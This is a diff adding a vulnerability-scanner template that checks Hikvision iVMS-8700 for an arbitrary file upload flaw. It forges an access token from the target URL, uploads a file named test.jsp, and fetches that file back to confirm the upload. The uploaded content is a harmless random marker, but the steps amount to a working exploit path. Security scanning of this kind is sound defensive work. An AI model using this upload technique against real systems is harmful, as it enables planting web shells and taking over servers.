@@ -1,0 +1,58 @@
+id: hikvision-ivms-8700-arbitrary-file-upload
+info:
+  name: HIKVISION iVMS-8700 Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for arbitrary file upload vulnerability in Hikvision iVMS-8700 platform.
+
+variables:
+  boundary: "{{rand_base(10)}}"
+  token: "{{to_upper(md5(concat(BaseURL, '/eps/api/resourceOperations/uploadsecretKeyIbuilding')))}}"
+  v1: "{{md5(rand_base(8))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-check
+    method: POST
+    path:
+      - "/eps/api/resourceOperations/upload?token={{token}}"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}"
+    body: |
+      ------WebKitFormBoundary{{boundary}}
+      Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
+      Content-Type: image/jpeg
+
+      {{v1}}
+      ------WebKitFormBoundary{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"success":true,"message":"上传附件成功"'
+      - type: regex
+        regex:
+          - '"resourceUuid":"(?P<fname>.*?)"'
+    extractors:
+      - type: regex
+        name: resource_uuid
+        regex:
+          - '"resourceUuid":"(?P<fname>.*?)"'
+        internal: true
+
+  - id: file-access-check
+    method: GET
+    path:
+      - "/eps/upload/{{fname}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{v1}}"
+      - type: status
+        status:
+          - 200
